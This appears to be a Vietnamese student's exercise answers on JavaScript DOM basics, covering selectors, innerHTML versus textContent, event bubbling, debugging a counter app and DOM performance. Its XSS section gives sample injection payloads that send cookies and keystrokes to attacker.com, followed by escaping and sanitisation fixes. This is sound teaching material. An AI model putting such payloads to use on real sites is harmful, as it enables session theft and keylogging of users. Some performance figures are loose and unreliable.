# PHẦN A — KIỂM TRA ĐỌC HIỂU (15 điểm)

## Câu A1 (5đ) — DOM Tree

### 1. Vẽ DOM tree cho HTML:

```
#document
└── #app (div#app)
    ├── header
    │   ├── h1
    │   │   └── "Todo App" (text)
    │   └── nav
    │       ├── a.active
    │       │   └── "All" (text)
    │       ├── a
    │       │   └── "Active" (text)
    │       └── a
    │           └── "Completed" (text)
    └── main
        ├── form#todoForm
        │   ├── input#todoInput
        │   └── button
        │       └── "Add" (text)
        └── ul#todoList
            ├── li.todo-item
            │   └── "Learn HTML" (text)
            └── li.todo-item.completed
                └── "Learn CSS" (text)
```

### 2. querySelector cho mỗi yêu cầu:

| Yêu cầu | querySelector |
|---------|--------------|
| Chọn thẻ `<h1>` | `document.querySelector("h1")` |
| Chọn input trong form | `document.querySelector("#todoForm input")` hoặc `document.querySelector("#todoInput")` |
| Chọn tất cả .todo-item | `document.querySelectorAll(".todo-item")` |
| Chọn link đang active | `document.querySelector("a.active")` hoặc `document.querySelector("nav a.active")` |
| Chọn `<li>` đầu tiên trong #todoList | `document.querySelector("#todoList li")` hoặc `document.querySelector("#todoList .todo-item:first-child")` |
| Chọn tất cả `<a>` bên trong `<nav>` | `document.querySelectorAll("nav a")` |

---

## Câu A2 (5đ) — innerHTML vs textContent

### Giải thích sự khác nhau:

| Tính chất | `innerHTML` | `textContent` |
|-----------|-----------|--------------|
| **Tác dụng** | Lấy/gán nội dung HTML (bao gồm tags) | Lấy/gán chỉ text thuần (không tags) |
| **Xử lý HTML** | Phân tích & render HTML tags | Coi HTML tags như text bình thường |
| **Hiệu năng** | Chậm hơn (cần parse HTML) | Nhanh hơn (chỉ text) |
| **Bảo mật** | ⚠️ **Nguy hiểm - XSS** | ✅ **An toàn** |

### Ví dụ khi nào dùng mỗi cái:

#### Dùng `innerHTML`:
```javascript
// Khi bạn muốn render HTML code (đã an toàn/kiểm duyệt):
const app = document.querySelector("#app");
app.innerHTML = `
    <h2>Welcome</h2>
    <p>Hello <strong>User</strong></p>
`;
// Output: Welcome | Hello User (với text đậm)
```

#### Dùng `textContent`:
```javascript
// Khi chỉ muốn hiển thị text:
const message = document.querySelector("#message");
message.textContent = "Price: $99.99";
// Output: Price: $99.99
// Không render HTML nếu có

// Khi user nhập vào - luôn dùng textContent
const userComment = document.querySelector("#comment-input").value;
document.querySelector("#display").textContent = userComment;
// Nội dung được display như text thuần, không thực thi HTML
```

### Ví dụ thực tế:

```javascript
const div = document.querySelector("div");

// innerHTML
div.innerHTML = "<b>Bold</b>";  // → Hiển thị: **Bold** (đậm)

// textContent
div.textContent = "<b>Bold</b>"; // → Hiển thị: <b>Bold</b> (như text)
```

---

### 🚨 Câu hỏi bảo mật: XSS Vulnerability

#### Tại sao innerHTML có thể gây lỗ hổng XSS?

**XSS (Cross-Site Scripting)** là tấn công inject code JavaScript độc hại vào trang web.

`innerHTML` **phân tích và thực thi** HTML code → nếu user input chứa script/event, nó sẽ chạy.

#### Ví dụ code minh họa - ĐÃ BÌNH LUẬN:

```javascript
// ⚠️ NGUY HIỂM - Không bao giờ làm thế này:
const userInput = document.querySelector("#search").value;
// Giả sử user nhập: <img src=x onerror="alert('Hacked!')">

document.querySelector("#result").innerHTML = userInput;
// → Trình duyệt sẽ chạy: alert('Hacked!')
// → Attacker có thể: đánh cắp cookies, session, redirect đến trang giả mạo, v.v.
```

#### Cách khác nhau để tấn công:

```javascript
// Hacker có thể nhập vào input:

// 1. Popup alert:
<img src=x onerror="alert('XSS!')">

// 2. Đánh cắp cookies:
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// 3. Thêm keylogger:
<img src=x onerror="document.addEventListener('keydown', (e) => { fetch('http://attacker.com/log?key=' + e.key); })">

// 4. Redirect đến trang giả mạo:
<img src=x onerror="window.location='http://fake-bank.com'">
```

#### ✅ CÁC CÁCH SỬA:

**Cách 1: Dùng textContent thay vì innerHTML**
```javascript
const userInput = document.querySelector("#search").value;
document.querySelector("#result").textContent = userInput;
// ✅ An toàn - HTML tags được coi như text
```

**Cách 2: Escape HTML tags**
```javascript
function escapeHTML(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

const userInput = document.querySelector("#search").value;
const escapedInput = escapeHTML(userInput);
document.querySelector("#result").innerHTML = escapedInput;
// ✅ An toàn - tags bị escape thành text
```

**Cách 3: Sanitize bằng thư viện (Best Practice)**
```javascript
// Dùng DOMPurify hoặc tương tự
const userInput = document.querySelector("#search").value;
const cleanHTML = DOMPurify.sanitize(userInput);
document.querySelector("#result").innerHTML = cleanHTML;
// ✅ An toàn & linh hoạt - cho phép safe HTML, loại bỏ malicious code
```

**Tóm tắt - Best Practices:**
- ✅ Dùng `textContent` cho user input
- ✅ Escape HTML nếu phải dùng `innerHTML`
- ✅ Validate & sanitize dữ liệu trước khi render
- ⚠️ Tránh dùng `innerHTML` với dữ liệu từ user trực tiếp

---

## Câu A3 (5đ) — Event Bubbling

### Hiểu về Event Bubbling:

**Event bubbling** = sự kiện "nổi bọt" từ element bị click lên các element cha.

Thứ tự: `BUTTON` → `INNER` → `OUTER`

### HTML Structure:
```html
<div id="outer">
    <div id="inner">
        <button id="btn">Click me</button>
    </div>
</div>
```

### Scenario 1: Không có `stopPropagation()`

```javascript
document.querySelector("#outer").addEventListener("click", () => {
    console.log("OUTER");
});

document.querySelector("#inner").addEventListener("click", () => {
    console.log("INNER");
});

document.querySelector("#btn").addEventListener("click", (e) => {
    console.log("BUTTON");
    // stopPropagation() commented out
});
```

**Khi click vào button:**

```
Output:
BUTTON
INNER
OUTER
```

**Giải thích:**
1. Button được click → chạy event handler của button → `BUTTON`
2. Event "nổi bọt" lên parent (#inner) → `INNER`
3. Event tiếp tục nổi bọt lên grandfather (#outer) → `OUTER`

---

### Scenario 2: Với `stopPropagation()`

```javascript
document.querySelector("#btn").addEventListener("click", (e) => {
    console.log("BUTTON");
    e.stopPropagation();  // ← uncomment
});
```

**Khi click vào button:**

```
Output:
BUTTON
```

**Giải thích:**
1. Button được click → chạy event handler → `BUTTON`
2. `e.stopPropagation()` dừng sự kiện từ nổi bọt tiếp tục
3. Event không truyền lên parent/grandfather
4. Chỉ in `BUTTON` mà thôi

---

### Bảng so sánh:

| Điều kiện | Output |
|-----------|--------|
| **Bình thường (bubbling)** | `BUTTON` → `INNER` → `OUTER` |
| **Với stopPropagation()** | `BUTTON` (dừng tại đây) |

---

### Các phương thức khác liên quan:

```javascript
event.stopPropagation()      // Ngăn event bubble lên
event.preventDefault()        // Ngăn hành động mặc định (VD: form submit)
event.stopImmediatePropagation() // Ngăn bubble + các listener khác trên element này
```

### Ví dụ thực tế - Event Delegation (sử dụng bubbling):

```javascript
// Cách 1: Thêm listener cho mỗi item (không hiệu quả)
document.querySelectorAll(".item").forEach(item => {
    item.addEventListener("click", () => console.log("Clicked item"));
});

// Cách 2: Thêm listener cho parent (event delegation - tốt hơn)
document.querySelector(".list").addEventListener("click", (e) => {
    if (e.target.matches(".item")) {
        console.log("Clicked item:", e.target.textContent);
    }
});
```

---

## Tóm tắt 15 điểm:

| Câu | Điểm | Nội dung |
|-----|------|---------|
| **A1** | 5đ | DOM tree + querySelector (mỗi 1 đúng = 0.5đ × 10) |
| **A2** | 5đ | innerHTML vs textContent + XSS fix |
| **A3** | 5đ | Event bubbling prediction + stopPropagation |

---

# PHẦN C 

## Câu C1 

### Tìm và sửa tất cả lỗi (7 lỗi chính):

#### **Lỗi 1**: Sai tên event (dòng 17)
```javascript
// ❌ SAI:
document.querySelector("#decrementBtn").addEventListener("onclick", function() {

// ✅ ĐÚNG:
document.querySelector("#decrementBtn").addEventListener("click", function() {
```
**Giải thích**: `addEventListener` dùng tên event là "click", không phải "onclick" (đó là attribute HTML cũ)

---

#### **Lỗi 2**: Gán giá trị sai cho DOM element (dòng 23)
```javascript
// ❌ SAI:
countDisplay = count;  // Gán số vào biến - mất reference tới DOM element!

// ✅ ĐÚNG:
countDisplay.textContent = count;  // Hoặc: countDisplay.innerHTML = count;
```
**Giải thích**: `countDisplay = count;` ghi đè biến, từ đó `countDisplay` không còn là reference tới DOM element nữa, các lần sau không thể update được.

---

#### **Lỗi 3**: DecrementBtn không cập nhật history (dòng 20-22)
```javascript
// ❌ SAI:
document.querySelector("#decrementBtn").addEventListener("click", function() {
    count--;
    countDisplay.innerHTML = count;
    // Thiếu: không thêm vào history như incrementBtn!
});

// ✅ ĐÚNG:
document.querySelector("#decrementBtn").addEventListener("click", function() {
    count--;
    countDisplay.innerHTML = count;
    
    // Lưu history - giống như incrementBtn
    const li = document.createElement("li");
    li.textContent = "Count changed to " + count;
    li.addEventListener("click", function() {
        deleteHistory(this);
    });
    historyList.append(li);
});
```

---

#### **Lỗi 4 & 6**: innerHTML = null thay vì innerHTML = "" (dòng 24 & 34)
```javascript
// ❌ SAI:
historyList.innerHTML = null;  // null không phải cách đúng

// ✅ ĐÚNG:
historyList.innerHTML = "";    // Hoặc: historyList.textContent = "";
```
**Giải thích**: `innerHTML = null` không clean HTML đúng cách. Dùng `""` (empty string) là cách chuẩn.

---

#### **Lỗi 5**: Thiếu dấu ngoặc () khi gọi function (dòng 29)
```javascript
// ❌ SAI:
items.forEach(item => {
    item.remove;  // Chỉ reference function, không gọi nó!
});

// ✅ ĐÚNG:
items.forEach(item => {
    item.remove();  // Phải có () để gọi function
});
```
**Giải thích**: `item.remove;` là reference tới function, không thực thi. Cần `item.remove();` để gọi.

---

#### **Lỗi 7**: localStorage trả về string, cần convert sang number (dòng 39)
```javascript
// ❌ SAI:
count = localStorage.getItem("count");  // Trả về string "5" chứ không phải số 5
countDisplay.textContent = count;       // "5" + 1 = "51" (string concatenation!)

// ✅ ĐÚNG:
count = parseInt(localStorage.getItem("count")) || 0;  // Convert to number, default 0
countDisplay.textContent = count;
```
**Giải thích**: `localStorage` luôn trả về string. Nếu không convert, `count++` sẽ là string concatenation: "5" + 1 = "51"

---

### ✅ CODE ĐÃ SỬA HOÀN CHỈNH:

```javascript
// App: Counter with history
const countDisplay = document.querySelector(".count");
const historyList = document.getElementById("history");

let count = 0;

// ✅ Increment button
document.querySelector("#incrementBtn").addEventListener("click", function() {
    count++;
    countDisplay.textContent = count;  // FIX: Dùng .textContent, không gán trực tiếp
    
    // Lưu history
    const li = document.createElement("li");
    li.textContent = "Count changed to " + count;
    li.addEventListener("click", function() {
        deleteHistory(this);
    });
    historyList.append(li);
});

// ✅ Decrement button (FIX: Thay "onclick" → "click" + thêm history tracking)
document.querySelector("#decrementBtn").addEventListener("click", function() {  // FIX: "click" không "onclick"
    count--;
    countDisplay.textContent = count;
    
    // FIX: Thêm history update như incrementBtn
    const li = document.createElement("li");
    li.textContent = "Count changed to " + count;
    li.addEventListener("click", function() {
        deleteHistory(this);
    });
    historyList.append(li);
});

// ✅ Reset button
document.querySelector("#resetBtn").addEventListener("click", () => {
    count = 0;
    countDisplay.textContent = count;  // FIX: Gán đúng cách
    historyList.innerHTML = "";        // FIX: "" thay vì null
});

// ✅ Delete single history item
function deleteHistory(element) {
    element.parentNode.removeChild(element);
}

// ✅ Clear all history
document.querySelector("#clearHistory").addEventListener("click", () => {
    const items = historyList.querySelectorAll("li");
    items.forEach(item => {
        item.remove();  // FIX: Thêm () để gọi function
    });
});

// ✅ Save to localStorage
window.addEventListener("beforeunload", () => {
    localStorage.setItem("count", count);
    localStorage.setItem("history", historyList.innerHTML);
});

// ✅ Load from localStorage  
window.addEventListener("load", () => {
    count = parseInt(localStorage.getItem("count")) || 0;  // FIX: Convert to number + default 0
    countDisplay.textContent = count;
});
```

---

## Câu C2 (7đ) — Performance

### Phần 1: Event Delegation

#### **Tại sao bind event lên 1000 elements riên lẻ là BAD PRACTICE?**

**Vấn đề:**
```javascript
// ❌ BAD - 1000 event listeners riên lẻ
const buttons = document.querySelectorAll(".btn");  // 1000 buttons
buttons.forEach(btn => {
    btn.addEventListener("click", handleClick);
    // → Tạo 1000 function references trong memory
    // → Mỗi element giữ một listener riêng
});
```

**Hậu quả:**
- 📈 **Chiếm memory nhiều**: 1000 listeners = 1000 function objects trong RAM
- 🐢 **Chậm khi DOM đổi**: Thêm button mới phải thêm listener manuelly
- 🔄 **Khó quản lý**: Muốn remove listener phải loop 1000 lần

---

#### **Cách Event Delegation giải quyết:**

```javascript
// ✅ GOOD - Event Delegation (1 listener)
document.querySelector(".button-container").addEventListener("click", (e) => {
    if (e.target.matches(".btn")) {
        handleClick(e);
    }
});
```

**Ưu điểm:**
- 💾 **Tiết kiệm memory**: Chỉ 1 listener dù có 1000 buttons
- ⚡ **Nhanh hơn**: Dùng event bubbling, không cần lặp
- 🎯 **Linh hoạt**: Buttons mới được tự động "nhận" events mà không cần code thêm
- 🧹 **Dễ quản lý**: Remove 1 listener là xong, tất cả buttons mất listener

**So sánh:**

| Tiêu chí | Bind riêng lẻ | Event Delegation |
|----------|---------------|------------------|
| **Memory** | ❌ 1000 listeners | ✅ 1 listener |
| **DOM mới** | ❌ Thêm code | ✅ Tự động hoạt động |
| **Hiệu năng** | ❌ Chậm | ✅ Nhanh |
| **Quản lý** | ❌ Phức tạp | ✅ Đơn giản |

---

### Phần 2: DocumentFragment Performance

#### **Bài toán gốc (Inefficient):**
```javascript
// ❌ BAD - Tạo 1000 reflows
const list = document.getElementById("myList");
for (let i = 1; i <= 1000; i++) {
    const li = document.createElement("li");
    li.textContent = `Item ${i}`;
    list.appendChild(li);  // ← Mỗi lần append = 1 reflow!
    // → 1000 reflows tổng cộng 😱
}
```

---

#### **Giải pháp: DocumentFragment**
```javascript
// ✅ GOOD - Chỉ 1 reflow
const list = document.getElementById("myList");
const fragment = document.createDocumentFragment();

for (let i = 1; i <= 1000; i++) {
    const li = document.createElement("li");
    li.textContent = `Item ${i}`;
    fragment.appendChild(li);  // ← Append vào fragment (not real DOM)
}

list.appendChild(fragment);  // ← Chỉ 1 lần append thật vào DOM = 1 reflow!
```

---

#### **Tại sao nhanh hơn?**

**Hiểu Reflow:**
- Reflow = Trình duyệt recalculate layout của trang
- Mỗi lần thêm element vào DOM → 1 reflow
- Reflow quá nhiều = browser lag, animation chập

**DocumentFragment:**
- Fragment **KHÔNG** phải part của real DOM
- Append vào fragment → KHÔNG trigger reflow
- Append fragment vào DOM → trigger **1 reflow duy nhất**

**So sánh tốc độ:**

```
❌ BAD:   1000 reflows (1000 append riên lẻ)
✅ GOOD:  1 reflow (1 append fragment)

→ Tốc độ: GOOD nhanh hơn ~100x lần!
```

---

#### **Ví dụ so sánh hiệu năng:**

```javascript
// ❌ SLOW (~500ms)
console.time("slow");
const list1 = document.getElementById("list1");
for (let i = 0; i < 1000; i++) {
    const li = document.createElement("li");
    li.textContent = `Item ${i}`;
    list1.appendChild(li);  // 1000 reflows
}
console.timeEnd("slow");

// ✅ FAST (~10ms)
console.time("fast");
const list2 = document.getElementById("list2");
const frag = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
    const li = document.createElement("li");
    li.textContent = `Item ${i}`;
    frag.appendChild(li);  // Không reflow
}
list2.appendChild(frag);  // 1 reflow
console.timeEnd("fast");

// → Nhanh hơn 50x lần!
```

---

#### **Khi nào dùng DocumentFragment:**
- ✅ Thêm **nhiều elements** một lúc (> 10)
- ✅ Cải thiện performance critical features
- ✅ Loop thêm DOM nodes

#### **Khi nào không cần:**
- ❌ Thêm 1-2 elements
- ❌ Performance không quan trọng

---

## Tóm tắt Phần C:

| Câu | Điểm | Nội dung |
|-----|------|---------|
| **C1** | 8đ | 7 lỗi: sai event, gán DOM, missing history, innerHTML=null, remove;, type conversion |
| **C2** | 7đ | Event Delegation (memory/performance) + DocumentFragment (1 reflow vs 1000) |
